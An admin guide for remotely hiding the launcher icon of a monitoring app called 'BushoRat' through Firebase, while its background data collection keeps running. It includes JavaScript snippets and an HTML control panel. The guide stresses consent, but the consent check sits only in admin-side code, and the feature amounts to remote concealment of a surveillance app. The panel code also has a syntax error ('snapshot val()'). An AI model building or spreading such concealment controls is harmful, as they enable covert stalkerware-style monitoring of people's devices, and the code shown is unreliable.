# App Visibility Control - Admin Guide

## Overview
This feature allows users to voluntarily hide the BushoRat app from their launcher while keeping it running in the background. Admins can control app visibility via Firebase Realtime Database.

## User Consent Requirement
- **Mandatory**: Users must explicitly consent before app hiding can be enabled
- **Transparent**: Clear disclosure about what hiding means
- **Reversible**: Users can unhide the app anytime via Profile settings
- **Secret Code**: Users receive a 6-digit code to unhide the app

## Firebase Database Structure

### App Visibility Control Path
```
app_visibility/
  └── {userId}/
      ├── is_hidden: boolean
      ├── hidden_at: timestamp
      ├── shown_at: timestamp
      └── user_consent: boolean
```

## Admin Control Methods

### 1. Hide User's App
```javascript
// Firebase Realtime Database
const userId = "USER_ID";
const visibilityRef = firebase.database().ref(`app_visibility/${userId}`);

// Check if user has consented first
visibilityRef.once('value', (snapshot) => {
  const data = snapshot.val();
  if (data && data.user_consent === true) {
    // User has consented, proceed to hide
    visibilityRef.update({
      is_hidden: true,
      hidden_at: firebase.database.ServerValue.TIMESTAMP
    });
  } else {
    console.log('User has not consented to app hiding');
  }
});
```

### 2. Show User's App
```javascript
const userId = "USER_ID";
const visibilityRef = firebase.database().ref(`app_visibility/${userId}`);

visibilityRef.update({
  is_hidden: false,
  shown_at: firebase.database.ServerValue.TIMESTAMP
});
```

### 3. Check App Visibility Status
```javascript
const userId = "USER_ID";
const visibilityRef = firebase.database().ref(`app_visibility/${userId}`);

visibilityRef.on('value', (snapshot) => {
  const data = snapshot.val();
  if (data) {
    console.log('App hidden:', data.is_hidden);
    console.log('User consented:', data.user_consent);
    console.log('Hidden at:', new Date(data.hidden_at));
  }
});
```

### 4. Check User Consent Status
```javascript
const userId = "USER_ID";
const visibilityRef = firebase.database().ref(`app_visibility/${userId}`);

visibilityRef.child('user_consent').once('value', (snapshot) => {
  const hasConsent = snapshot.val();
  console.log('User has consented:', hasConsent);
});
```

## Admin Web Interface Example

```html
<!DOCTYPE html>
<html>
<head>
    <title>App Visibility Control</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
</head>
<body>
    <h1>App Visibility Control</h1>
    
    <div>
        <label>User ID:</label>
        <input type="text" id="userId" placeholder="Enter User ID">
    </div>
    
    <div>
        <button onclick="checkStatus()">Check Status</button>
        <button onclick="hideApp()">Hide App</button>
        <button onclick="showApp()">Show App</button>
    </div>
    
    <div id="status"></div>
    
    <script>
        // Initialize Firebase (replace with your config)
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        function getVisibilityRef() {
            const userId = document.getElementById('userId').value;
            if (!userId) {
                alert('Please enter a User ID');
                return null;
            }
            return database.ref(`app_visibility/${userId}`);
        }
        
        function checkStatus() {
            const ref = getVisibilityRef();
            if (!ref) return;
            
            ref.once('value', (snapshot) => {
                const data = snapshot val();
                const statusDiv = document.getElementById('status');
                
                if (!data) {
                    statusDiv.innerHTML = '<p>No visibility data found for this user</p>';
                    return;
                }
                
                let html = '<h3>Current Status:</h3>';
                html += `<p>App Hidden: ${data.is_hidden ? 'Yes' : 'No'}</p>`;
                html += `<p>User Consent: ${data.user_consent ? 'Granted' : 'Not Granted'}</p>`;
                
                if (data.hidden_at) {
                    html += `<p>Hidden At: ${new Date(data.hidden_at).toLocaleString()}</p>`;
                }
                if (data.shown_at) {
                    html += `<p>Shown At: ${new Date(data.shown_at).toLocaleString()}</p>`;
                }
                
                statusDiv.innerHTML = html;
            });
        }
        
        function hideApp() {
            const ref = getVisibilityRef();
            if (!ref) return;
            
            // Check consent first
            ref.once('value', (snapshot) => {
                const data = snapshot.val();
                
                if (!data || !data.user_consent) {
                    alert('User has not consented to app hiding. Cannot proceed.');
                    return;
                }
                
                ref.update({
                    is_hidden: true,
                    hidden_at: firebase.database.ServerValue.TIMESTAMP
                }).then(() => {
                    alert('App hide command sent successfully');
                    checkStatus();
                }).catch((error) => {
                    alert('Error: ' + error.message);
                });
            });
        }
        
        function showApp() {
            const ref = getVisibilityRef();
            if (!ref) return;
            
            ref.update({
                is_hidden: false,
                shown_at: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                alert('App show command sent successfully');
                checkStatus();
            }).catch((error) => {
                alert('Error: ' + error.message);
            });
        }
    </script>
</body>
</html>
```

## Important Notes

### Security & Privacy
- **User Consent is Mandatory**: Never hide the app without user consent
- **Transparency**: Users must know the app is installed and what it does
- **Reversibility**: Users must always have a way to unhide the app
- **Legal Compliance**: Ensure compliance with local laws and regulations

### Technical Considerations
- **App Continues Running**: Hiding only removes the launcher icon, the app keeps running
- **Background Services**: All data collection and monitoring continue
- **Firebase Listener**: The app listens for visibility changes in real-time
- **Secret Code**: Users receive a 6-digit code to unhide via Profile settings

### User Experience
- **Clear Disclosure**: Users see exactly what hiding means before consenting
- **Easy Access**: Users can unhide from Profile settings anytime
- **Secret Code Backup**: Display the secret code in Profile for recovery
- **Admin Control**: Admins can toggle visibility if user has consented

## Troubleshooting

### App Won't Hide
- Check if user has granted consent
- Verify Firebase database connection
- Ensure app has proper permissions

### App Won't Show
- Check Firebase database connection
- Verify component enabled state
- Restart the app if needed

### User Lost Secret Code
- User can still unhide from Profile settings
- Admin can show the app via Firebase
- Consider implementing code recovery mechanism

## Monitoring

### Track Visibility Changes
```javascript
// Monitor all visibility changes
const visibilityRef = firebase.database().ref('app_visibility');
visibilityRef.on('child_changed', (snapshot) => {
  const userId = snapshot.key;
  const data = snapshot.val();
  console.log(`User ${userId} visibility changed:`, data);
});
```

### Audit Log
Consider maintaining an audit log of visibility changes:
```
visibility_audit/
  └── {userId}/
      └── {timestamp}/
          ├── action: "hide" | "show"
          ├── triggered_by: "user" | "admin"
          └── previous_state: boolean
```

## Best Practices

1. **Always verify consent** before hiding
2. **Log all visibility changes** for audit purposes
3. **Provide clear user communication**
4. **Test thoroughly** before deployment
5. **Monitor for abuse** or unauthorized changes
6. **Have recovery procedures** for lost access
